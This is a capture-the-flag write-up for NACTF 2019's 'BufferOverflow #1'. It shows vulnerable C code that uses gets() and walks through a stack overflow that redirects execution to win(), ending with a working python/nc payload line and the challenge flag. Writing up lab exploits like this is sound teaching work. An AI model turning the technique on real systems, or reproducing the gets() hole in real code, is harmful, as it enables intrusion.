# BufferOverflow #1
Points: 200

## Category
Binary Exploitation

## Question
>The close cousin of a website for "Question marked as duplicate" - part 2!

>Can you redirect code execution and get the flag?

>Connect at shell.2019.nactf.com:31462

### Hint
>pwntools can help you with crafting payloads

## Solution
Contents of `bufover-1.c`
```
#include <stdio.h>

void win()
{
	printf("You win!\n");
	char buf[256];
	FILE* f = fopen("./flag.txt", "r");
	if (f == NULL)
	{
		puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
	}
	else
	{
		fgets(buf, sizeof(buf), f);
		printf("flag: %s\n", buf);
	}
}

void vuln()
{
	char buf[16];
	printf("Type something>");
	gets(buf);
	printf("You typed %s!\n", buf);
}

int main()
{
	/* Disable buffering on stdout */
	setvbuf(stdout, NULL, _IONBF, 0);

	vuln();
	return 0;
}
```
For this challenge we have to control the overflow and direct it to the `win() function` The first thing you need to know is the address of the `win() function`. 
Use `readelf -s bufover-1`. The address of `win()` is `080491b2`.
Remember to convert the address into Little Endian.

Next, we have to know how many bytes to cause an overflow. Inspecting the `bufover-1.c` file say that `gets(buf)` has a buffer size of `16`. Therefore, we have to print greater than 16 character to cause an overflow but remember we have to control it and direct it to `win()`. Use command `python -c "print 'A'*20" | ./bufover-1`, we can start with 20 and increment by 4 till we can get a `segmentation fault`. 

To know whether we have caused `segmentation fault`, we can check with `dmesg | tail -2`. Repeat `python -c "print 'A'*20" | ./bufover-1` with increments by 4 until we get something similar to this.
```bash
[17418.603345] bufover-1[6635]: segfault at 41414141 ip 0000000041414141 sp 00000000ffa2ca00 error 14 in libc-2.28.so[f7da1000+1d7000]

```
The value of A in ASCII is 41. So AAAA is 41414141

`Segmentation fault` occurs when we print 32 bytes ('A'*32). Remove 4 bytes `'A'*28` then add the address of `win()` from earlier. Your final code will be this: 
`python -c "import struct; print 'A'*28 + struct.pack('<I', 0x080491b2)" | nc shell.2019.nactf.com 31462` and you will get the flag. 

`-c` is to run as console.
`sturct.pack('<I', address)` is to convert into little endian format.
### Flag
`nactf{pwn_31p_0n_r3t_iNylg281}`
